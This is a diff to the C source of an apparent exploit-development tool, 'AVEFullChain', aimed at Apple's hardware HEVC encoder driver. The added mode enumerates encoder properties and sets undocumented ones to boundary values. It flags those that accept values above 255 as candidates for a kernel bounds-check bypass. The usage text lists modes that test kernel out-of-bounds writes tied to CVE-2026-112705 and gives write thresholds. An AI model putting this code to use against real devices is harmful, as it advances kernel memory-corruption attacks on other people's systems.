@@ -3292,6 +3292,170 @@ cleanup_dummies:
 
         rlog("\n=== RESOLUTION_PROBE complete ===\n");
 
+    } else if (strcmp(mode, "enum_properties") == 0) {
+        /*
+         * Enumerate ALL supported properties on the hardware HEVC encoder.
+         * Uses VTSessionCopySupportedPropertyDictionary to discover every
+         * configurable parameter. This reveals which properties reach the
+         * kernel driver and could have weak bounds checking.
+         */
+        rlog("=== ENUM_PROPERTIES: Discovering all HEVC encoder properties ===\n\n");
+
+        int w = 1920, h = 1080;
+        VTCompressionSessionRef s = create_mvhevc_encoder(w, h, 1);
+        if (!s) {
+            rlog("Failed to create MV-HEVC encoder\n");
+
+            /* Try standard HEVC as fallback */
+            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(enc_spec,
+                kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder,
+                kCFBooleanTrue);
+            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+                kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
+            CFRelease(enc_spec);
+            if (st != noErr || !s) {
+                rlog("Failed to create any HEVC encoder: %d\n", (int)st);
+                goto done;
+            }
+            rlog("Using standard HEVC encoder (no MV-HEVC)\n\n");
+        }
+
+        CFDictionaryRef props = NULL;
+        OSStatus st = VTSessionCopySupportedPropertyDictionary(s, &props);
+        if (st != noErr || !props) {
+            rlog("VTSessionCopySupportedPropertyDictionary failed: %d\n", (int)st);
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+            goto done;
+        }
+
+        CFIndex count = CFDictionaryGetCount(props);
+        rlog("Found %ld supported properties:\n\n", (long)count);
+
+        /* Get all keys and values */
+        const void **keys = malloc(sizeof(void*) * count);
+        const void **vals = malloc(sizeof(void*) * count);
+        CFDictionaryGetKeysAndValues(props, keys, vals);
+
+        for (CFIndex i = 0; i < count; i++) {
+            CFStringRef key = (CFStringRef)keys[i];
+            CFDictionaryRef info = (CFDictionaryRef)vals[i];
+
+            /* Get property name as C string */
+            char keystr[256] = {0};
+            CFStringGetCString(key, keystr, sizeof(keystr), kCFStringEncodingUTF8);
+
+            rlog("[%ld] %s\n", (long)i, keystr);
+
+            /* Extract property metadata if it's a dictionary */
+            if (CFGetTypeID(info) == CFDictionaryGetTypeID()) {
+                /* PropertyType */
+                CFStringRef ptype = CFDictionaryGetValue(info, CFSTR("PropertyType"));
+                if (ptype) {
+                    char tstr[64] = {0};
+                    CFStringGetCString(ptype, tstr, sizeof(tstr), kCFStringEncodingUTF8);
+                    rlog("    Type: %s", tstr);
+                }
+
+                /* ReadWriteStatus */
+                CFStringRef rw = CFDictionaryGetValue(info, CFSTR("ReadWriteStatus"));
+                if (rw) {
+                    char rwstr[32] = {0};
+                    CFStringGetCString(rw, rwstr, sizeof(rwstr), kCFStringEncodingUTF8);
+                    rlog("  RW: %s", rwstr);
+                }
+
+                /* MinimumValue / MaximumValue for numeric types */
+                CFNumberRef minv = CFDictionaryGetValue(info, CFSTR("SupportedValueMinimumKey"));
+                CFNumberRef maxv = CFDictionaryGetValue(info, CFSTR("SupportedValueMaximumKey"));
+                if (minv) {
+                    double mv = 0;
+                    CFNumberGetValue(minv, kCFNumberDoubleType, &mv);
+                    rlog("  Min: %.0f", mv);
+                }
+                if (maxv) {
+                    double mv = 0;
+                    CFNumberGetValue(maxv, kCFNumberDoubleType, &mv);
+                    rlog("  Max: %.0f", mv);
+                }
+
+                /* SupportedValueList for enum types */
+                CFArrayRef vlist = CFDictionaryGetValue(info, CFSTR("SupportedValueListKey"));
+                if (vlist) {
+                    CFIndex vcount = CFArrayGetCount(vlist);
+                    rlog("  Values(%ld):", (long)vcount);
+                    for (CFIndex v = 0; v < vcount && v < 10; v++) {
+                        CFTypeRef val = CFArrayGetValueAtIndex(vlist, v);
+                        if (CFGetTypeID(val) == CFStringGetTypeID()) {
+                            char vstr[64] = {0};
+                            CFStringGetCString(val, vstr, sizeof(vstr), kCFStringEncodingUTF8);
+                            rlog(" %s", vstr);
+                        } else if (CFGetTypeID(val) == CFNumberGetTypeID()) {
+                            int iv = 0;
+                            CFNumberGetValue(val, kCFNumberIntType, &iv);
+                            rlog(" %d", iv);
+                        }
+                    }
+                }
+
+                rlog("\n");
+            }
+        }
+
+        free(keys);
+        free(vals);
+        CFRelease(props);
+
+        /* Also test some undocumented properties */
+        rlog("\n--- Testing undocumented/edge-case properties ---\n");
+        const char *test_props[] = {
+            "NumberOfTemporalLayers",
+            "ReferenceBufferCount",
+            "MaxSliceBytes",
+            "MaxFrameDelayCount",
+            "BaseLayerBitRateFraction",
+            "MinimizeMemoryUsage",
+            "MaximizePowerEfficiency",
+            NULL
+        };
+
+        for (int p = 0; test_props[p]; p++) {
+            CFStringRef pk = CFStringCreateWithCString(NULL, test_props[p],
+                kCFStringEncodingUTF8);
+            CFTypeRef curval = NULL;
+            OSStatus gs = VTSessionCopyProperty(s, pk, NULL, &curval);
+            rlog("  %s: get=%d", test_props[p], (int)gs);
+            if (gs == noErr && curval) {
+                if (CFGetTypeID(curval) == CFNumberGetTypeID()) {
+                    int iv = 0;
+                    CFNumberGetValue(curval, kCFNumberIntType, &iv);
+                    rlog(" value=%d", iv);
+                }
+                CFRelease(curval);
+            }
+
+            /* Try setting to boundary values */
+            int test_vals[] = {0, 1, 255, 256, 1024, 65535};
+            for (int t = 0; t < 6; t++) {
+                CFNumberRef nv = CFNumberCreate(NULL, kCFNumberIntType, &test_vals[t]);
+                OSStatus ss = VTSessionSetProperty(s, pk, nv);
+                if (ss == noErr) {
+                    rlog(" set(%d)=OK", test_vals[t]);
+                }
+                CFRelease(nv);
+            }
+            rlog("\n");
+            CFRelease(pk);
+        }
+
+        VTCompressionSessionInvalidate(s);
+        CFRelease(s);
+        rlog("\n=== ENUM_PROPERTIES complete ===\n");
+        rlog("Properties accepting values > 255 without error are candidates\n");
+        rlog("for kernel-side bounds check bypass (like NumberOfTemporalLayers).\n");
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
@@ -3325,6 +3489,7 @@ cleanup_dummies:
         rlog("  interleave_prepare [prep] [enc] -- Interleave PrepareToEncodeFrames between encodes\n");
         rlog("  temporal_layers [max] [unsafe] -- CVE-2026-112705: test NumberOfTemporalLayers boundary\n");
         rlog("  resolution_probe [unsafe]      -- Test large resolution kernel OOB (CVE-2026-112705 variant)\n");
+        rlog("  enum_properties                -- Enumerate ALL supported encoder properties and boundary test\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
